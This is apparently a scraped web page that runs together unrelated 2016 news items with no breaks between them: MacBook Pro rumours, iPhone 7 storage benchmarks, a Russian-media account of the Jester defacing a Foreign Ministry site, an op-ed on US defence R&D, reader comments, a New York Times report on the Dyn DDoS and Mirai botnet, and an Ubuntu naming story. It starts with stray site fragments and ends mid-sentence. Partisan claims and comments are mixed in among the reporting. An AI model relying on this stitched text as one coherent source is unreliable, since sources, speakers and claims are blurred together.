Brings Built-in Emoji on Linux more on: Mozilla Firefox 50.0 i softpedia®     Like 202K    +1 56K     Follow 13K © 2001-2016 Softpedia.

Noted Apple analyst Ming-Chi Kuo of KGI Securities predicts that the revamped MacBook Pro lineup is going to come with a “MagSafe-like” USB-C adapter. Kuo predicted in a note to investors that this new adapter will either by introduced by Apple or a third-party but holds firm on the possibility that the revamped MacBook Pro will feature a USB Type-C port for charging and data transfer instead of a MagSafe port found on previous MacBooks. Apple made the shift to USB Type-C for its notebooks with the 12 inch MacBook last year. The analyst also predicts that the new MacBook Pro lineup is going to be powered by Intel Skylake processors and options will include up to 2TB of SSD storage. Screen resolutions are said to be identical to existing MacBook Pro models. Previous rumors suggest that the new MacBook Pro models will also feature an OLED touch bar, a fingerprint sensor, new keyboard with butterfly mechanism, and Thunderbolt 3. Apple is not expected to announce new iMacs at this event, but who knows what’s going to happen until the company officially announces its new products on October 27th. Fingers crossed!

It's down to Apple's use of slower storage modules in the low-end phone. With the iPhone 7, Apple finally put an end to its 16GB storage option after facing criticism from reviewers and customers. The iPhone 7 now comes with 32GB of storage as standard, giving users more space for apps, music and photos. The higher capacity appears to come at the cost of performance though. Independent testing by GSMArena and Unbox Therapy has demonstrated that 32GB iPhone 7 handsets are significantly slower than their pricier siblings, to the point that owners are likely to notice the difference. Unbox Therapy's Lew Hilsenteger measured the storage read performance of the 32GB model as being 200Mbps slower than the 256GB version. The two devices achieved 686Mbps and 856Mbps respectively. The gap here is notable but unlikely to have any impact during regular use of the handset. The real problems are revealed during the write performance test. The 256GB phone clocked in at a respectable 341MB per second. The 32GB model managed just 42MB per second though, eight times slower than the higher-capacity model. This difference could be significant for people who heavily use their phone. When saving very large files to storage, the 32GB iPhone will take noticeably longer to complete the write than the more expensive versions. This will be particularly noticeable in scenarios such as saving 4K video, one of the iPhone 7's headline features. With just a few minutes of 4K shooting creating file sizes in the multiple gigabytes, an eight times slower write speed will restrict how quickly aspiring cinematographers can create new clips. Hilsenteger demonstrated the effects of the performance difference in a real-world test. The 256GB iPhone copied a 4.2GB movie from a MacBook in two minutes and 34 seconds. The 32GB model took three minutes and 40 seconds to complete the same transfer. Apple claims that there is no performance difference between the various iPhone 7 models available. While its website is clearly not accurate, the discrepancies have been attributed to the general characteristics of SSD-based storage. There does not appear to be an Apple plot to make people spend more on higher-end iPhones. It's well known that larger SSDs tend to significantly outperform lower-capacity ones because they are able to operate more storage channels in parallel. This is what is causing the discrepancies observed during reviewers' benchmarks. Storage speed isn't the only metric that seems to vary between iPhone 7 variants. Testing conducted by Cellular Insights earlier this week revealed that the models also have drastically different cellular signal strengths. The firm found that model numbers A1778 and A1784 have noticeably poorer performance than model numbers A1660 and A1661. The former two versions have modems built by Intel while the latter two have Qualcomm chips. Qualcomm is a far more established modem manufacturer than Intel and manufactures the modems inside the majority of modern phones. Intel has only recently entered the space. According to Cellular Insights, the newcomer's hardware shows between 30 percent and 75 percent worse performance than Qualcomm's, a finding which doesn't bode well for Intel's future mobile efforts. Winning the contract to supply some modems for the iPhone 7 was a significant step forward for Intel, a company that has historically failed to make its presence known in the mobile market. It could lose its foothold altogether if Apple is dissatisfied with its performance.

For months now it’s been expected that Apple would hold such a fall event to introduce new, non-iOS related hardware, possibly including anything from the Mac lineup, from the MacBook Air to a new Mac Pro. Well, Ming-Chi Kuo, the KGI Securities analyst with one of best track records when it comes to Apple predictions, has chimed in to say that we should keep our expectations set for new laptops only. Kuo notes that the flagship unveiling will be a new MacBook Pro, touting the much rumored OLED touch bar and Touch ID sensor, along with USB-C ports. This will come in both existing sizes of 13 and 15 inches, and will include the 2015 MacBook’s new butterfly keyboard, Thunderbolt 3, SSD storage up to 2TB, and Skylake processors from Intel. Beyond the new Pro lineup, Kuo expects a refreshed “13-inch MacBook,” which will more than likely be a revamped MacBook Air instead of a slightly larger version of the 12-inch MacBook. Like the Pro, this laptop will be outfitted with USB-C, further cementing Apple’s decision to rely on the new, smaller port. There was hope that this event would also see refreshed iMacs and/or a new stand-alone Thunderbolt Display, but Kuo says that while Apple is indeed working on this hardware, they won’t be seen at Thursday’s event. Instead, he’s predicting new iMacs and a 5K Cinema Display to be announced sometime in the first half of 2017. SOURCE MacRumors Story Timeline Hated MacBook?

US Continues to Play Its 'Dirty Sanctions Game' Against RussiaThe old version of the Russian Ministry of Foreign Affairs website was hacked on Saturday, Russian Foreign Ministry spokeswoman Maria Zakharova told the radio station Govorit Moskva on Sunday. "The website was hacked. Who did it – that's what the experts are trying to figure out. Attacks on the website have become more frequent since 2013," Zakharova said. An internet hacker by the name of "Jester" posted online on Saturday, claiming to have hacked the Russian Ministry of Foreign Affairs website, apparently unaware it was the archived site. He posted a link to a message placed on the site by hacking its computer code. #ICYMI MSG 'From Russia with Love' — I'm Jester & I approve this message via the Russian Foreign Affairs Website >> https://t.co/K0pwcChX8N — JΞSTΞR ✪ ΔCTUAL³³º¹ (@th3j35t3r) 22 октября 2016 г. ​"Comrades! We interrupt regular scheduled Russian Foreign Affairs Website programming to bring you the following important message," Jester wrote. © Photo: The Russian Ministry of Foreign Affairs A screenshot of the website of Russian Ministry of Foreign Affairs   The hacker told the US television channel CNN that he'd decided to hack a Russian institution after Friday's cyber attack on Washington-based web technology provider Dyn, one of the country's biggest hosts of Domain Name Servers (DNS).  "I wanted to poke them in the eye and stop feeling like the US is just taking it on the chin. Again," Jester told CNN. On Friday, hackers subjected Dyn's DNS infrastructure to a distributed denial of service (DDoS) attack, which overwhelmed the web service with traffic and disrupted the work of several websites, including PayPal and Twitter. © REUTERS/ Jim Urquhart/File Photo 'Experts' Stunned: Trump’s Doubt of US Intel's Groundless Claims of Russian Hack ‘Defies Logic’Although some US politicians including Democratic presidential candidate Hillary Clinton have accused Russian hackers of involvement in cyber attacks in the US, there is no evidence that Russian hackers were responsible for the cyber attack on Dyn or any other server. In a Facebook post, Zakharova explained that the hacker had only succeeded in hacking the older version of the Russian Foreign Ministry website, which has not been in use for over a year. The old website, along with the Ministry's current website, is working normally despite the hack. "If it is established the hack was carried out by the Americans, even if it is a resource that is not in use, then that's not very good because it shows that either the cyber-machine of destruction talked about by Biden and Mcfaul has started operating, or this hellishly provocative electoral campaign in the US has got people into such a state that they begin to destroy everything in their path," Zakharova wrote. The spokeswoman also referred to CNN's decision to publish its interview with "Jester" without seeking confirmation about a hack from the Ministry. "Before publishing information about the hack of the Ministry of Foreign Affairs website by an American hacker, CNN did not approach the Ministry of Foreign Affairs for confirmation. Apparently, they (CNN) have some compelling evidence that this was a hack, and the American hacker carried it out. Well, of course CNN can't publish unverified information," Zakharova added with sarcasm. ...

The Jester is also apart of the systems of "VIRAL" understanding. To continue to "paint" the minds eye with considerations entirely "weaved" by "Military Experts".

On Saturday, October 1, 2016 an apparent citizen of the United States of America accessed and defaced a web site belonging to the Russian Ministry of Foreign Affairs. This action was disrespectful to the Russian Federation, our Honorable, Valued and Respected International Partner. The supposed vigilante action has brought great disrespect, shame, and humility upon the United States of America. As a respectable and honorable gesture of goodwill, an offer to extradite the Jester for Prosecution and Sentencing to the Russian Federation must be made.

(Johan Nylander) the brief Spengler2016 US ElectionsTop Pick Small-ball conservatism or national greatness? By David P. Goldman, Columnist October 23, 2016 8:46 PM (UTC+8) Share Tweet Linkedin Print Email Share 0 Comment 0 Asia Times is not responsible for the opinions, facts or any media content presented by contributors. In case of abuse, click here to report. Small-ball conservatism dominates mainstream Republican thinking. It finds expression in the writing of Ramesh Pommeru, Ross Douthat, and Yuval Levin, whose “conservative governing vision” sees a kind of: … American life in which government does not use society as an instrument to advance progressive aims but rather sustains and strengthens the space in which society can thrive and enables all Americans to take part in what happens in that space. The DailyBrief Must-reads from across Asia - directly to your inbox “Such a government would no doubt be much smaller, more restrained, and less expensive than the one we have today. It would be fiscally sustainable, averting the catastrophe we face if our entitlement programs are not and reinforcing the private economy rather than draining it of resources. Levin calls this a “modernized politics of subsidiarity — that is, of putting power, authority and significance as close to the level of interpersonal community as reasonably possible,” that is, doing a lot of good, small things at the base of civil society. If we play small ball, we will lose. Specifically, we will lose America’s technological and scientific pre-eminence, our dominant position as a military power, and a significant part of our living standard. In a competitive world, “losing” doesn’t mean giving up a couple of points of GDP growth: It means the sort of decline that the United Kingdom suffered in the 1950s and 1960s, when its auto, shipbuilding gand machine-building industries virtually disappeared. Small-ball conservatism ignores the most important feature of the global economic landscape: our competitors. This isn’t 1981, when the digital revolution overwhelmed the Soviet Union’s formidable advantages in conventional arms. When Ronald Reagan took office, the world’s high-tech entrepreneurs had no place to go except America. American universities had a monopoly on high-end technology, the American defense and space programs dominated cutting-edge research, and American capital markets were the only ready source of capital for high-tech startups. We still have an edge but it is eroding quickly. America is a second-rate power in high-tech manufacturing, and our monopoly in key fields of knowledge is far from secure. We spend half of what we used to on defense R&D as a fraction of GDP. And we face new and self-confident competitors determined to leapfrog the United States. If we do not meet the hurdle of global competition, whatever good we do in small ways will not help. America won’t stumble its way back to national greatness. We have to hit on all cylinders at the same time, something we have not done since Ronald Reagan was in office. America’s decline in productivity, competitiveness, and skills is so advanced that nothing short of a focused national recovery plan will save us from a decline like that of the post-war United Kingdom. We need a national initiative to restore American technological supremacy, basic infrastructure, labor force participation, and above all a sense of national purpose and morale. Our point of reference should be Ronald Reagan’s Strategic Defense Initiative, a mustering of intellectual and entrepreneurial resources to leapfrog the Asian competitors who now threaten to gain a technological edge that we may never reverse unless we reverse it soon. This is the conservatism of big things: the melding of national defense and space exploration with an opening of opportunities to a new generation of entrepreneurs. Tax cuts and regulatory rollback is an indispensable component of the policy mix—just as it was under Reagan. America’s success formula in the past allowed private risk-takers to adopt the new technologies that emerged from the requirements of defense and aerospace. Industrial policy—foisting risk onto the taxpayers—produces cronyism, corruption and failure. But the demands of defense technology raised the bar in basic R&D and created game-changing innovations that made the modern American economy possible. A defense driver in scientific research allied to private risk-taking is the combination that raised America out of 1970s stagflation and gave us the longest expansion in modern history. Our national security requirements and economic needs are complementary. America’s technological edge in defense is under severe challenge. We confront a host of new prospective threats: satellite-killer technologies, ship-killer missiles, hypersonic missiles designed to defeat our air defenses, new radar designed to defeat existing stealth technology, and cyberwar, to name the most visible. Russia’s S-400 and S-500 may now be the best air defense systems available. China’s anti-ship missiles and stealth submarines may neutralize American aircraft carriers in the Western Pacific. Quantum computing and other technologies threaten the security of communications. Our power grid is vulnerable to electromagnetic pulse weapons. It is easy to talk about getting tough with Russia and China. But it is not clear that we would win a sea war with China in the South China Sea or a land war with Russia in the Ukraine, for example. That enervates our negotiating position with our competitors and prospective adversaries and leaves us to deal from a weaker position than we have had since the 1980s. We spent over US$4 trillion in Iraq and Afghanistan since 2002, but we allowed defense R&D spending to fall by half as a percentage of GDP. America’s position is more perilous than it was at the end of the stagflation of the 1970s: America’s population is aging rapidly, with 15% of the total above 65 in 2015, rising to 20% by 2030. America had little foreign competition as a venue for entrepreneurial startups in 1979. The world’s capital and talent had nowhere else to go but the United States. Now there are numerous competing venues for technological entrepreneurship. Asia, and particularly China, has acted aggressively to close the technology gap with the United States and have leapfrogged American manufacturing in a number of key industries. Federal debt was only 30% of GDP in 1979 (not counting unfunded entitlements), but rose to 110% in 2015. Obstacles to growth (a 70% top marginal tax rate and inflationary monetary policy) were easy to identity and remedy. America’s backlog of productivity-enhancing technologies has shrunk, in large part because defense R&D is half of what is was in the late 1970s relative to GDP. We need to Double federal spending on defense and aerospace R&D Institute crash programs to leapfrog our competitors in key weapons systems, including cyberwar, air defense, drone technologies, stealth, EMP and battlefield command and control; Take the initiative to land on Mars in emulation of the 1960s Moonshot program; Repair basic infrastructure. Roll back regulations that strangle small business and stifle competition; Drastically reduce corporate and capital gains taxes. Defend selected industries against predatory practices by Asian competitors We need a dramatic national initiative rather than incremental solutions. The American engine of growth and innovation has broken down, and time is short. We have the lowest productivity growth since the Jimmy Carter era, and low productivity growth corresponds to declining federal R&D spending. As a percent of GDP, federal R&D spending is half of what it was during the Reagan era. The actual state of affairs is worse than the aggregate numbers suggest, because so much of the national R&D budget has been absorbed by a single program, the F-35 fighter. Whatever the merits of this weapons system—and its merits are persuasively deprecated by many credible analysts—its cost has been such to starve every other field of defense R&D during the past ten years. To be great again, America has to the retake the lead in innovation. And the great source of innovation has been defense and the space program. Henry Kressel, the former director of RCA Labs, and I described how defense R&D created technologies with great commercial potential, in an October 2013 essay for The American Interest: Among the other notable outcomes of R&D funded under government defense and space programs were the standard manufacturing process for integrated circuits and commercially feasible lasers. Both innovations were developed at RCA, the company David Sarnoff built. Today practically all chips produced worldwide are made in the CMOS process, which began as a Defense Department project at RCA in the 1970s. Defense wanted to explore the possibility of creating computing chips with lower power dissipation than the then-current technology could produce. After successful completion of the project, CMOS technology was used to manufacture chips for avionic radar systems, among other applications. It found its way into the commercial market in the 1980s. A second example, the development of semiconductor lasers at RCA Laboratories… was originally funded in the 1960s by the Defense Department to develop infrared searchlights that could illuminate a battlefield, but would be invisible to the naked eye. As the technology progressed in the late 1960s and early 1970s, it became clear that it would be possible to use such lasers in fiber optic communications systems. RCA announced a commercial laser in 1969 that was based on technology developed largely under Defense Department funding. Companion technologies also sprang up that greatly expanded the ways in which lasers could be used. This led to their current status as not only the key to all fiber optic communication systems, including voice and data networks, but also as the enabling technology of millions of instruments, DVD players and a host of other devices. At the request of Norman A. Bailey, then Director of Plans at National Security Council, this writer produced a study in 1985 arguing that the Strategic Defense Initiative then floated by the Reagan Administration would pay for itself by fostering innovation, just as the Apollo Program had created US$7 in economic output for every US$1 spent by NASA, according to one estimate. National security drives innovation because it places demands on science to do things that have not been done before, and that our adversaries cannot do. Without productivity growth, investment, wages and real incomes will remain depressed. Economic growth will continue to languish at near-recession levels. During the 1980s, a new set of technologies transformed the American economy. Semiconductors, communications, lasers and other innovations created new industries in computation, telecommunications, entertainment, media and retail. According to the Census Bureau’s Business Dynamics Statistics, new firms created more than 100% of all jobs created between 1992 and 2005. The Kaufmann Foundation summarized the Census Data in a July 2010 report: Firms in their first year of existence add an average of 3 million jobs per year. By construction, the BDS defines an existing firm—age one up to age twenty-six and beyond—such that it can both create and lose jobs. In contrast, a startup, or age zero firm, only creates jobs because it experiences no gross job destruction. We might anticipate that the net job gain also would be positive at existing firms, but that is decisively not the case during most years on record. Notably, the figure shows that, during recessionary years, job creation at startups remains stable, while net job losses at existing firms are highly sensitive to the business cycle. A radical turnaround took place after the Great Recession. Census Bureau data show a net reduction in the number of new firms as well as workers employed by new firms between 2007 and 2013. Small Firms Decline in Number and Total Employment between 2007 and 2013 (Census Bureau) At the grass roots of the economy, venture capital investment has sought social media, apps and other “soft” investments with low capital and labor requirements and avoided “hard” investments in manufacturing, telecommunications and other fields with large capital and labor requirements. During the 1980s and 1990s, America dominated technological progress through a group of disruptive new companies—Microsoft, Google, Cisco, Intel, Oracle and others. The former technological vanguard, though, has turned into a group of stable consumer monopolies. This is clear from the trading pattern of their stocks. We see that the technology subsector of the S&P 500 equity index traded with a volatility (standard deviation of returns calculated over a rolling six-month period) roughly double that of the overall index during the late 1990s and early 2000’s. That reflects the greater risk and reward attached to innovators as opposed to established companies. By the late 2000’s, the volatility of the tech sector was the same as that of the overall index. The risk (and also the prospective reward) had shrunk to the overall level of the economy as the great wave of innovation dissipated. We are in a depression in all but name. When the unemployment rate peaked at 25% in 1933, it was reckoned against a male labor force participation rate in excess of 90 percent. The percentage of men employed stood in the high 60 percent range. Today we have a male labor force participation rate of 68%, roughly the same—disguised by social programs, college loans, and other means of enabling a quarter of the labor force to remain permanently idle. High-tech industrial production has been shifting away from the United States since the late 1990s. Until the late 1990s, America ran a substantial surplus in high-tech goods. In the early 2000’s that turned into a deficit which is likely to reach US$100 billion during 2016. Most of America’s trade deficit in high-tech goods consists of technologies invented in the United States, supported in each case by federally-fund research sponsored by the Department of Defense and NASA. The seven technologies listed below constitute the basic elements of all modern electronics from computers to smart phones. And in each case, their manufacture has migrated to Asia because Asian governments adopted the previous American practice of supporting basic R&D. The economic benefits of the digital revolution that originated in the United States have shifted to Asia. America’s share in the manufacture and distribution of its own inventions is relatively small. The core digital technologies are: Liquid crystal displays employed in almost all economic products, with US$100 billion in annual sales. South Korea controls 35% of the market, Taiwan 25% and China 20.% Light-emitting diodes (LEDs) are produced mainly in China and Taiwan. China and Taiwan dominate the production of semiconductor lasers, the energy source for fiber optic communications. Solid state sensors, which generate images in digital cameras and related devices, are produced mainly in Taiwan and Japan. Flash memory is produced mainly in South Korea, Japan and China, with only 10% of world output coming from the US. Integrated circuits are a US$270 billion global industry. Most are produced in Taiwan and South Korea, and China has undertaken an aggressive investment program in the industry. Less than a quarter of world output is produced in the US. Solar energy panels, a US$30 billion industry, are dominated by China. Some of the Asian advantage is the result of theft of intellectual property, but most of it stems from above-board collaboration of government and industry. Asian countries have licensed US technologies, supported joint ventures with US companies in order to foster technology transfer, and made cheap capital available to high-tech industry. Asian governments also have supported technical education. China now graduates twice as many STEM PhD’s each year as the United States. America developed most, but not all, of the technology that build Asian manufacturing. But Asian dependence on American technology is starting to diminish. China’s flagship high-tech manufacturer, Huawei, now employs tens of thousands of engineers, including thousands of Western researchers in several centers in Europe. A decade ago Huawei was regularly accused of stealing Western technology; now it is a vigorous defender of intellectual property rights, because it is heavily committed to innovation of its own. It is a slippery slope. If we continue to lose ground, we may never have the chance to come back. Nothing short of a great national effort will give us the chance to come back. And the first thing that is required is for an American president to declare that a great national effort is underway, with the sense of purpose that informed the Eisenhower and Kennedy responses to Russian gains in space during the 1950s, or Reagan’s commitment to win the Cold War and defend America from missile attack. There are many individual things that must be done, but there is one big thing that must be done. That is to identify a national goal and commit the full resources of the United States to achieving it.

Apple will also announce a brand new model of the new MacBook with a screen measuring thirteen inches diagonally, Kuo wrote in a note to clients. Some observers think this machine is actually a thirteen-inch MacBook Air with new USB-C ports. As you know, the current Retina MacBook has a 12-inch Retina display. Next-generation iMacs, as well as a rumored 5K resolution display won’t be unveiled at the event because they’re apparently not ready yet. According to the report, the upcoming MacBook Pro refresh will include two models: one with a thirteen-inch screen and the other with a fifteen-inch one. The new machines should have an OLED touch bar replacing the function key row with programmable shortcuts that change from one app to another, Touch ID sensor (likely integrated into the power button), USB-C, Thunderbolt 3 and the same low-profile keyboard with butterfly mechanism like the new MacBook, among other features. The OLED touch bar would be controlled by a new dedicated chip which Kuo claims bears resemblance to the processor that powers the Apple Watch. From the report: Our new predictions also include: (1) Intel’s (US) Skylake processor; (2) the same panel resolution but better display quality and energy efficiency thanks to an oxide panel; (3) a new option of 2TB SSD storage capacity; (4) adoption of a similar processor as Apple Watch to control the OLED touch bar more energy-efficiently in the new MacBook Pro models; and (5) a Type-C & MagSafe-like adapter rolled out by Apple or a third-party supplier, given positive reviews for the MagSafe charging design. The iMac, Apple’s popular all-in-one desktop, as well as its rumored external display with a 27-inch screen featuring 5K resolution (likely matching the resolution of the 5K iMac) should be expected in the first half of 2017, according to the analyst. We also expect Apple to launch new iMacs (21.5-inch and 27-inch) and Cinema Display (27-inch) in mid-1H17. We cannot say for certain whether Apple will announce the new iMacs and Cinema Display on October 27 as the shipping schedule is not imminent. Although the next iMac and 5K display won’t ship this year, Apple could choose to announce and preview them at Thursday’s event. A few years back, the company previewed the radically redesigned Mac Pro even though the powerful desktop computer wouldn’t start shipping until six months later. Speaking of which, Kuo makes absolutely no mention of any Mac Pro-focused refresh. I hope Apple won’t disappoint its loyal fan base of creative pros who need a powerful desktop, Unfortunately, it’s been increasingly difficult to justify dropping more than three-thousand dollars on the Mac Pro’s three-year-old hardware. The Mac-focused “Hello again” media event is scheduled for October 27 and we will be providing remote coverage of the announcements as they happen.

CAIO MARIZ® Quad Core Kaby Lake doesn’t exist yet 5723alex . Kaby Lake is a crappy CPU. Hope Apple won’t use it. Rolf Bause Yeah, but they are coming in the beginning of 2017. We are waiting for 2 years now with the new MacBooks, without any update, not even a processor update… Might as well wait a few months longer now and at least catch the Intel release cycle. All the other big manufacturers already have Skylake… howcome they are able to do this, and Apple isn’t? CAIO MARIZ® Kaby lake will not support Intel Iris Pro Graphics, so worse battery, they will jump Kaby lake Rolf Bause from what I’ve read they will have an Intel HD Graphics 620… CAIO MARIZ® Less powerful than current Haswell Iris Pro, Broadwell Iris Pro and Skylake Iris Pro Rolf Bause Ok, in this particular case Skylake is probably really the better choice then (what r they thinking at Intel)… But when did this ever happen, that the next gen was worse than the previous? My main point was: Why the hell aren’t they able to synchronize their release cycles better for christ sake? Apple is (as far as I know) Intels biggest buyer of chips… you could really expect better imo. CAIO MARIZ® I don’t know why they can’t synchronize their release cycles with the intel’s ones Jack Wong Other than i5 and 2013 mid MacBook Air, I don’t even remember what is the name of my processors?! Does it really matter? Rolf Bause Yes it does. Jack Wong Would you mind to list one to two benefit of that? Rolf Bause The benefit is that you know if you got the latest technology or not and if you got screwed or not 😉 And you probably have a Haswell btw Jack Wong I don’t really concern about the CPU anymore, how powerful it could be on a laptop. I would rather have 16GB ram, longer battery life and more cheap SSD storage on the Air since the task I am doing the most are just browsing, remote into other computers and word/excel file. I don’t convert video that often. But it seems like Apple doesn’t want to give that 16GB RAM to the MacBook and MacBook Air line… Rolf Bause You don’t need 16GB of RAM for any of this 😉 But in general I’m with you there. The RAM and SSD upgrade option are just ridiculous… it’s pure greed. If Xiaomi develop their Mi notebooks some more (idk, v2-3 or so :D)… I’ll maybe give it a shot and make a hackintosh :D. They give you all these things: removeable ssd, 2nd ssd slot – for half the price. Jack Wong Yes/No, I am trying so hard to utilize the ram usage on the Virtual Box, plugins and browsers… Just like do we need 1TB SSD storage on laptop?! Yes/No, I would be more lazy to organize if I have 1TB storage but like you said… the upgrade price for SSD is ridiculous… I have 8GB ram and 512GB SSD, 256GB originally, but I got really lucky to get a 512GB SSD(pulled from MacBook Pro) from eBay for $375 last year then sold the 256GB for $200. If I want any Mac laptop with 512GB… it would cost me 1.5k+… I guess… I can only have 1 wish for my next laptop, either USB-C chargeable or 16GB ram. Rolf Bause Transcend has some decent SSD upgrades (Transcend JetDrive). 500gb cost a little less than 300 bucks… 1tb around 500. Jack Wong Those are not as fast, no thank you. If there is no new laptop that I can afford/like on this Thurs, then I would get a new battery for the current Air, I will also go for OEM instead of third party. Rolf Bause The PCI-e based ones aren’t as fast… the SATA drives are supposed to be fine. askep3 “The OLED touch bar would be controlled by a new dedicated chip which Kuo claims bears resemblance to the processor that powers the Apple Watch.” This way the main processsor doesn’t have to handle the touch bar! Alan Aurmont So, the lineup: Air is dead Mini will be dead soon It all leads to the following naming: iPad – iPad Pro iPhone – iPhone Pro (next year with iPhone 8) Mac – Mac Pro MacBook – MacBook Pro Now, the size is where I’m not quite sure what’s gonna happen. 13″ MacBook makes it all confusing. Will they revive 11″ and kill 12″? If they do, we may have 11″/13″ MacBook and 13″/15″ MacBook Pro. 12″ alongside 13″ just wouldn’t make any sense.

SANGER and NICOLE PERLROTHOCT. 22, 2016 Continue reading the main story Share This Page Continue reading the main story Photo Dyn DNS, a company that essentially acts as a giant internet switchboard, was bombarded with messages that overloaded its circuits. Credit Nathaniel Brooks for The New York Times WASHINGTON — When surveillance cameras began popping up in the 1970s and ’80s, they were welcomed as a crime-fighting tool, then as a way to monitor traffic congestion, factory floors and even baby cribs. Later, they were adopted for darker purposes, as authoritarian governments like China’s used them to prevent challenges to power by keeping tabs on protesters and dissidents. But now those cameras — and many other devices that today are connected to the internet — have been commandeered for an entirely different purpose: as a weapon of mass disruption. The internet slowdown that swept the East Coast on Friday, when many Americans were already jittery about the possibility that hackers could interfere with election systems, offered a glimpse of a new era of vulnerabilities confronting a highly connected society. The attack on the infrastructure of the internet, which made it all but impossible at times to check Twitter feeds or headlines, was a remarkable reminder about how billions of ordinary web-connected devices — many of them highly insecure — can be turned to vicious purposes. And the threats will continue long after Election Day for a nation that increasingly keeps its data in the cloud and has oftentimes kept its head in the sand. Remnants of the attack continued to slow some sites on Saturday, though the biggest troubles had abated. Still, to the tech community, Friday’s events were as inevitable as an earthquake along the San Andreas fault. A new kind of malicious software exploits a long-known vulnerability in those cameras and other cheap devices that are now joining up to what has become known as the internet of things. Continue reading the main story Advertisement Continue reading the main story The advantage of putting every device on the internet is obvious. It means your refrigerator can order you milk when you are running low, and the printer on your home network can tell a retailer that you need more ink. Security cameras can alert your cellphone when someone is walking up the driveway, whether it is a delivery worker or a burglar. When Google and the Detroit automakers get their driverless cars on the road, the internet of things will become your chauffeur. Advertisement Continue reading the main story But hundreds of thousands, and maybe millions, of those security cameras and other devices have been infected with a fairly simple program that guessed at their factory-set passwords — often “admin” or “12345” or even, yes, “password” — and, once inside, turned them into an army of simple robots. Each one was commanded, at a coordinated time, to bombard a small company in Manchester, N.H., called Dyn DNS with messages that overloaded its circuits. Few have heard of Dyn, but it essentially acts as one of the internet’s giant switchboards. Bring it to a halt, and the problems spread instantly. It did not take long to reduce Twitter, Reddit and Airbnb — as well as the news feeds of The New York Times — to a crawl. The culprit is unclear, and it may take days or weeks to detect it. In the end, though, the answer probably does not mean much anyway. The vulnerability the country woke up to on Friday morning can be easily exploited by a nation-state such as Russia, which the Obama administration has blamed for hacking into the Democratic National Committee and the accounts of Hillary Clinton’s campaign officials. It could also be exploited by a criminal group, which was the focus of much of the guesswork about Friday’s attack, or even by teenagers. The opportunities for copycats are endless. The starkest warning came in mid-September from Bruce Schneier, an internet security expert, who posted a brief essay titled “Someone Is Learning How to Take Down the Internet.” The technique was hardly news: Entities like the North Korean government and extortionists have long used “distributed denial-of-service” attacks to direct a flood of data at sites they do not like. “If the attacker has a bigger fire hose of data than the defender has,” he wrote, “the attacker wins.” But in recent times, hackers have been exploring the vulnerabilities of the companies that make up the backbone of the internet — just as states recently saw examinations of the systems that hold their voter registration rolls. Attacks on the companies escalated, Mr. Schneier wrote, “as if the attack were looking for the exact point of failure.” Think of the mighty Maginot Line, tested again and again by the German Army in 1940, until it found the weak point and rolled into Paris.

Privacy Policy The difference with the internet is that it is not clear in the United States who is supposed to be protecting it. The network does not belong to the government — or really to anyone. Instead, every organization is responsible for defending its own little piece. Banks, retailers and social media hubs are supposed to invest in protecting their websites, but that does not help much if the connections among them are severed. The Department of Homeland Security is supposed to provide the baseline of internet defense for the United States, but it is constantly playing catch-up. In recent weeks, it deployed teams to the states to help them find and patch vulnerabilities in their voter registration systems and their networks for reporting results. Advertisement Continue reading the main story The F.B.I. investigates breaches, but that takes time — and, in the meantime, people want to bank online and stream television shows. On Nov. 8, Americans will have to look up where they are supposed to vote, and, in a few cases, they will cast their votes on the internet. Yet the voting system is not considered part of the nation’s “critical infrastructure.” The head of the National Security Agency, Adm. Michael Rogers, said recently that experts were looking at the problem the wrong way. “We are over-focused on places and things,” he said in a talk at Harvard. “We need to focus on the data,” and how it flows — or doesn’t flow. That is where the internet of things comes in. Most of the devices have been hooked up to the web over the past few years with little concern for security. Cheap parts, some coming from Chinese suppliers, have weak or no password protections, and it is not obvious how to change those passwords. And the problem is quickly expanding: Cisco estimates that the number of such devices could reach 50 billion by 2020, from 15 billion today. Intel puts the number at roughly 200 billion devices in the same time frame. (Assuming the global population is around 7.7 billion people in 2020, that would be about six to 26 devices per person.) Security researchers have been warning of this problem for years, but that caution has largely been written off as hype or fear-mongering. Then Brian Krebs, who runs a popular site on internet security, was struck by a significant attack a few weeks ago. The company protecting him, Akamai, gave up. The malware behind the attack, called Mirai, had a built-in dictionary of common passwords and used them to hijack devices to become attackers. Chester Wisniewski, a principal computer research scientist at Sophos, a security company, said that attacks like the one on Dyn “might be the beginning of a new era of internet attacks conducted via ‘smart’ things.” “There are tens of millions more insecure ‘smart’ things that could cause incredible disruptions, if harnessed,” Mr. Wisniewski added in an email. It is possible, investigators say, that the attack on Dyn was conducted by a criminal group that wanted to extort the company. Or it could have been done by “hacktivists.” Or a foreign power that wanted to remind the United States of its vulnerability. The answer may not come by Election Day, but the next wave of attacks very well could. David E. Sanger reported from Washington, and Nicole Perlroth from San Francisco.

Tech News Downloads Software Store Search for: BetaNews Hot Topics: Windows 10 Microsoft Apple Cloud Tablets Android Security Reviews Follow Us: Twitter Facebook Linked-in RSS Canonical gives Ubuntu Linux 17.04 the name 'Zesty Zapus' (jumping mouse) By Brian Fagioli Published 4 weeks ago 12 Comments Tweet Linux distributions and silly names go together like peanut butter and jelly. For whatever reason, the maintainers of these operating systems seem to enjoy having fun with what they call them -- some argue it is childish. Even Google -- a billion dollar company -- uses sugary dessert names for the Linux-based Android operating system. One of the most well-known Linux distributions to use funny names is Ubuntu. It famously uses the convention of an adjective and a lesser-known animal, each starting with the same letter. The letter is chosen sequentially by alphabet. For example, Ubuntu 16.10 uses the letter "Y" -- "Yakkety Yak". The next version of the operating system will use the letter "Z". While many folks hoped for "Zebra", that would be too obvious. Instead, Canonical has chosen "Zesty Zapus". Don't know what a zapus is? Neither did I. It is apparently a type of jumping mouse. The selection was not made at random, however, as the company has an explanation for the decision. "As we come to the end of the alphabet, I want to thank everyone who makes this fun. Your passion and focus and intellect, and occasionally your sharp differences, all make it a privilege to be part of this body incorporate. Right now, Ubuntu is moving even faster to the centre of the cloud and edge operations. From AWS to the zaniest new devices, Ubuntu helps people get things done faster, cleaner, and more efficiently, thanks to you. From the launch of our kubernetes charms which make it very easy to operate k8s everywhere, to the fun people seem to be having with snaps at snapcraft.io for shipping bits from cloud to top of rack to distant devices, we love the pace of change and we change the face of love", says Mark Shuttleworth, CEO, Canonical. ALSO READ: System76 updates its affordable Ubuntu Linux 'Lemur' laptop with Intel Kaby Lake Shuttleworth further says, "we are a tiny band in a market of giants, but our focus on delivering free software freely together with enterprise support, services and solutions appears to be opening doors, and minds, everywhere. So, in honour of the valiantly tiny leaping long-tailed over the obstacles of life, our next release which will be Ubuntu 17.04, is hereby code named the Zesty Zapus". There you have it folks, "Zesty Zapus". The obvious question is, what will come next? As we find ourselves 